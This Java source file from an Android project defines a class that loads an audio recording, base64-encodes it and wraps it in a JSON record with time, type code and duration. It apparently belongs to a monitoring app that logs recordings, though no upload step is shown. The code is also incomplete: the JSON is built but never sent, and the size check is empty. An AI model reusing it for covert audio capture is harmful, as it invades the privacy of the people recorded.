package com.inet.android.audio;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

import org.json.JSONException;
import org.json.JSONObject;

import android.util.Base64;

import com.inet.android.utils.ConvertDate;

public class OperationWithAudio {
	String outPutFile;
	int minute;

	public OperationWithAudio(String outPutFile, int minute) {
		this.outPutFile = outPutFile;
		this.minute = minute;
	}

	public void SendData() {
		JSONObject AudioJson = new JSONObject();
		ConvertDate date = new ConvertDate();

		try {
			AudioJson.put("time", date.logTime());
			AudioJson.put("data", getData());
			AudioJson.put("type", "13");
			AudioJson.put("duration", minute);

		} catch (JSONException e) {
			// TODO Автоматически созданный блок catch
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private String getData() throws IOException {
		File file = new File(outPutFile);
		byte[] bytes = loadFile(file);
		String encoded = Base64.encodeToString(bytes, 0);
		return encoded;
	}

	private static byte[] loadFile(File file) throws IOException {
		InputStream is = new FileInputStream(file);

		long length = file.length();
		if (length > Integer.MAX_VALUE) {
			// File is too large
		}
		byte[] bytes = new byte[(int) length];

		int offset = 0;
		int numRead = 0;
		while (offset < bytes.length
				&& (numRead = is.read(bytes, offset, bytes.length - offset)) >= 0) {
			offset += numRead;
		}

		if (offset < bytes.length) {
			throw new IOException("Could not completely read file "
					+ file.getName());
		}

		is.close();
		return bytes;
	}
}
